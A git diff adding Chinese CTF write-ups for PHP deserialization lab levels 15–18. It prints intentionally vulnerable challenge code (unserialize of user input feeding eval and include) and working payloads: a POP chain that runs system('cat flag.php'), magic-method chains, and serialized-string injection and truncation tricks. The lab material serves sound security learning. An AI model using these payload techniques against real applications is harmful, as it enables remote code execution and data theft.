@@ -47,7 +47,10 @@ category: 网络安全
 - [[反序列化靶场]Level12-\_\_sleep()](https://www.nssctf.cn/problem/6294)
 - [[反序列化靶场]Level13-\_\_toString()](https://www.nssctf.cn/problem/6295)
 - [[反序列化靶场]Level14-\_\_invoke()](https://www.nssctf.cn/problem/6296)
-
+- [[反序列化靶场]Level15-POP链前置](https://www.nssctf.cn/problem/6297)
+- [[反序列化靶场]Level16-POP链构造](https://www.nssctf.cn/problem/6298)
+- [[反序列化靶场]Level17-字符串逃逸](https://www.nssctf.cn/problem/6299)
+- [[反序列化靶场]Level18-字符串逃逸2](https://www.nssctf.cn/problem/6300)
 
 ## \[反序列化靶场\]Level1-类的实例化
 
@@ -840,7 +843,369 @@ POST传参 o=$obj(get_flag);
 NSSCTF{96cc166d-3560-4da6-b2b9-be01d14d4d4a}
 ```
 
+## \[反序列化靶场\]Level15-POP链前置
+
+```php
+<?php  
+  
+/*  
+--- HelloCTF - 反序列化靶场 关卡 15 : POP链初步 ---   
+  
+世界的本质其实就是套娃（x  
+  
+# -*- coding: utf-8 -*-  
+# @Author: 探姬(@ProbiusOfficial)  
+# @Date:   2024-07-01 20:30  
+# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  
+# @email:  admin@hello-ctf.com  
+# @link:   hello-ctf.com  
+  
+*/  
+  
+/* FLAG in flag.php */  
+  
+class A {  
+    public $a;  
+    public function __construct($a) {        $this->a = $a;  
+    }  
+}  
+class B {  
+    public $b;  
+    public function __construct($b) {        $this->b = $b;  
+    }  
+}  
+class C {  
+    public $c;  
+    public function __construct($c) {        $this->c = $c;  
+    }  
+}  
+  
+class D {  
+    public $d;  
+    public function __construct($d) {        $this->d = $d;  
+    }  
+    public function __wakeUp() {        $this->d->action();  
+    }  
+}  
+  
+class destnation {  
+    var $cmd;  
+    public function __construct($cmd) {        $this->cmd = $cmd;  
+    }  
+    public function action(){  
+        eval($this->cmd->a->b->c);  
+    }  
+}  
+  
+if(isset($_POST['o'])) {    unserialize($_POST['o']);  
+} else {    highlight_file(__FILE__);  
+}
+```
+
+首先就是先确定最后的目标函数 发现eval函数存在于`destnation -> action`中
+
+里面的`$this->cmd->a->b->c` 以及题目中也提示了套娃
+
+所以这边需要构造pop链条进行套娃 根据提示反推
+
+```
+D -> destnation -> A -> B -> C
+```
+
+这边根据需要触发的函数action可以找到 D类的\_\_wakeup()函数触发action函数
+
+构造以上pop链
+
+Payload
+```php
+$a = new A(new B(new C("system('cat flag.php');")));
+$d = new D(new destnation($a));
+echo serialize($d);
+```
+Flag
+```php
+NSSCTF{088cdabb-bb38-40c5-9f74-d808dd1c75dd}
+```
 
 
----
-今天写累了 先写到这吧 明天再写下半部分
+## \[反序列化靶场\]Level16-POP链构造
+
+```php
+<?php
+/*
+--- HelloCTF - 反序列化靶场 关卡 16 : zePOP--- 
+
+__wakeUp() 方法用于反序列化时自动调用。例如 unserialize()。
+__invoke() 方法用于一个对象被当成函数时应该如何回应。例如 $obj() 应该显示些什么。
+__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。
+
+试着把他们串起来吧ww
+
+# -*- coding: utf-8 -*-
+# @Author: 探姬(@ProbiusOfficial)
+# @Date:   2024-07-01 20:30
+# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs
+# @email:  admin@hello-ctf.com
+# @link:   hello-ctf.com
+
+*/
+
+class A {
+    public $a;
+    public function __invoke() {
+            include $this->a;
+            return $flag;
+    }
+}
+
+class B {
+    public $b;
+    public function __toString() {
+        $f = $this->b;
+        return $f();
+    }
+}
+
+class INIT {
+    public $name;
+    public function __wakeUp() {
+        echo $this->name.' is awake!';
+    }
+}
+
+if(isset($_POST['o'])) {
+    unserialize($_POST['o']);
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+这个题目就是将前面学过的魔法函数进行串联，构建一条POP链
+
+题目中一共有三个类需要我们关注：
+
+- **INIT** — 反序列化时会触发 `__wakeUp()`，其中 `echo $this->name` 会将 `$this->name` 当作字符串输出
+- **B** — 定义了 `__toString()`，当一个对象被当作字符串时会触发该方法，内部将 `$this->b` 作为函数调用
+- **A** — 定义了 `__invoke()`，当一个对象被当作函数调用时会触发，内部 `include $this->a` 并返回 `$flag`
+
+目标很明确：想办法触发 `A::__invoke()` 去 include `flag.php` 拿到 `$flag`
+
+构建POP链：
+
+```
+INIT::__wakeUp()
+  → echo $this->name  (将name设为B对象，触发__toString)
+    → B::__toString()
+      → $f = $this->b; return $f();  (将b设为A对象，触发__invoke)
+        → A::__invoke()
+          → include flag.php → 输出$flag
+```
+
+所以反推链子为：`INIT → B → A`
+
+Payload：
+
+```php
+class A {
+    public $a = "flag.php";
+}
+
+class B {
+    public $b;
+}
+
+class INIT {
+    public $name;
+}
+
+$a = new A();
+$b = new B();
+$b->b = $a;
+$init = new INIT();
+$init->name = $b;
+
+echo serialize($init);
+// O:4:"INIT":1:{s:4:"name";O:1:"B":1:{s:1:"b";O:1:"A":1:{s:1:"a";s:8:"flag.php";}}}
+```
+
+直接POST传参即可
+
+得到Flag
+```
+NSSCTF{1e4957e8-c46b-4f46-87e6-5f0805e6b5f5}
+```
+
+
+## \[反序列化靶场\]Level17-字符串逃逸
+
+```php
+<?php
+/*
+--- HelloCTF - 反序列化靶场 关卡 17 : 字符串逃逸基础 --- 
+
+序列化和反序列化的规则特性_无中生有：当成员属性的实际数量符合序列化字符串中对应属性值时，似乎不会做任何检查？
+
+# -*- coding: utf-8 -*-
+# @Author: 探姬(@ProbiusOfficial)
+# @Date:   2024-07-01 20:30
+# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs
+# @email:  admin@hello-ctf.com
+# @link:   hello-ctf.com
+
+*/
+
+class A {
+
+}
+echo "Class A is NULL: '".serialize(new A())."'<br>";
+
+class B {
+    public $a = "Hello";
+    protected $b = "CTF";
+    private $c = "FLAG{TEST}";
+}
+echo "Class B is a class with 3 properties: '".serialize(new B())."'<br>";
+
+$serliseString = serialize(new B());
+$serliseString = str_replace('B', 'A', $serliseString);
+echo "After replace B with A,we unserialize it and dump :<br>";
+var_dump(unserialize($serliseString));
+
+if(isset($_POST['o'])) {
+    $a = unserialize($_POST['o']);
+    if ($a instanceof A && $a->helloctfcmd == "get_flag") {
+        include 'flag.php';
+        echo $flag;
+    } else {
+        echo "what's rule?";
+    }
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+这个题目可以用PHP反序列化的「无中生有」特性 — 反序列化时PHP不会检查类中是否真的存在某个属性，只要序列化字符串中声明了该属性及其值，就会直接赋予给对象。
+
+题目要求 `$a instanceof A && $a->helloctfcmd == "get_flag"`，但类`A`本身是空类，没有任何属性。
+
+所以我们直接构造一个类`A`的序列化数据，在序列化字符串中额外添加 `helloctfcmd` 属性即可。PHP反序列化时不会因为类中没有这个属性定义就报错，而是直接把属性赋给对象。
+
+Payload：
+
+```php
+class A {
+    public $helloctfcmd = "get_flag";
+}
+echo serialize(new A());
+// O:1:"A":1:{s:11:"helloctfcmd";s:8:"get_flag";}
+```
+
+或者也可以参考前面Demo中展示的字符串逃逸方法——序列化一个包含目标属性的类，再通过 `str_replace` 替换类名来得到A类的payload：
+
+```php
+class X {
+    public $helloctfcmd = "get_flag";
+}
+echo str_replace('X', 'A', serialize(new X()));
+// O:1:"A":1:{s:11:"helloctfcmd";s:8:"get_flag";}
+```
+
+两种方法本质相同，输出一致
+
+直接POST传参即可
+
+得到Flag
+```
+NSSCTF{8a8b6e00-862e-4129-99d2-31a5cc67b1aa}
+```
+
+## \[反序列化靶场\]Level18-字符串逃逸2
+
+```php
+<?php
+/*
+--- HelloCTF - 反序列化靶场 关卡 18 : 字符串逃逸基础 ---
+
+序列化和反序列化的规则特性,字符串尾部判定：进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 ";}" 作为字符串的结尾判定。
+
+# -*- coding: utf-8 -*-
+# @Author: 探姬(@ProbiusOfficial)
+# @Date:   2024-07-01 20:30
+# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs
+# @email:  admin@hello-ctf.com
+# @link:   hello-ctf.com
+
+*/
+
+highlight_file(__FILE__);
+
+class Demo {
+    public $a = "Hello";
+    public $b = "CTF";
+    public $key = 'GET_FLAG";}FAKE_FLAG';
+}
+
+class FLAG {
+
+}
+
+$serliseStringDemo = serialize(new Demo());
+
+$target = $_GET['target'];
+$change = $_GET['change'];
+
+$serliseStringFLAG = str_replace($target, $change, $serliseStringDemo);
+
+$FLAG = unserialize($serliseStringFLAG);
+
+if ($FLAG instanceof FLAG && $FLAG->key == 'GET_FLAG') {
+    echo $flag;
+}
+```
+
+这个题目进一步考察字符串逃逸的实战运用。题目通过 `str_replace($target, $change, ...)` 让我们对序列化字符串进行改造，需要同时满足两个条件：
+
+1. `$FLAG instanceof FLAG` — 反序列化出来的对象必须是类 `FLAG` 的实例
+2. `$FLAG->key == 'GET_FLAG'` — key 属性的值必须恰好为 `'GET_FLAG'`
+
+先看 `serialize(new Demo())` 得到的数据：
+
+```
+O:4:"Demo":3:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";s:3:"key";s:20:"GET_FLAG";}FAKE_FLAG";}
+```
+
+现在需要把它变成 FLAG 类、一个属性 key=GET_FLAG 的样子。
+
+`str_replace` 可以把序列化字符串中的一部分整体替换掉。这里用到了**字符串尾部判定**的特性：反序列化时，成员属性数量、名称长度、内容长度一致时，程序以 `";}` 作为字符串的结尾，后面的内容会被直接忽略。
+
+Payload 思路：把类名从 `Demo` 换成 `FLAG`，属性数量从 `3` 换成 `1`，只保留 `key` 属性且把值长度从 `20` 改成 `8`，让解析器只读取前 8 个字符 `GET_FLAG`，后面遇到的 `";}` 直接作为结尾。
+
+将 target 设为序列化字符串中需要替换的部分，change 设为目标内容：
+
+```
+target = O:4:"Demo":3:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";s:3:"key";s:20:"GET_FLAG";}FAKE_FLAG
+change = O:4:"FLAG":1:{s:3:"key";s:8:"GET_FLAG
+```
+
+替换后的序列化字符串变为：
+
+```
+O:4:"FLAG":1:{s:3:"key";s:8:"GET_FLAG";}
+```
+
+解析器按规则解析：
+- `O:4:"FLAG"` → FLAG 类 
+- `:1:` → 1 个属性 
+- `s:3:"key";s:8:"GET_FLAG"` → key = GET_FLAG 
+- 后面的 `";}` 作为结尾判定，剩余内容被忽略
+
+GET 传参即可：
+
+```
+?target=O%3A4%3A%22Demo%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A5%3A%22Hello%22%3Bs%3A1%3A%22b%22%3Bs%3A3%3A%22CTF%22%3Bs%3A3%3A%22key%22%3Bs%3A20%3A%22GET_FLAG%22%3B%7DFAKE_FLAG&change=O%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A8%3A%22GET_FLAG
+```
+
+得到Flag
+```
+NSSCTF{603cb710-9c86-4cd5-88c8-1e6cb6fc2c8e}
+```
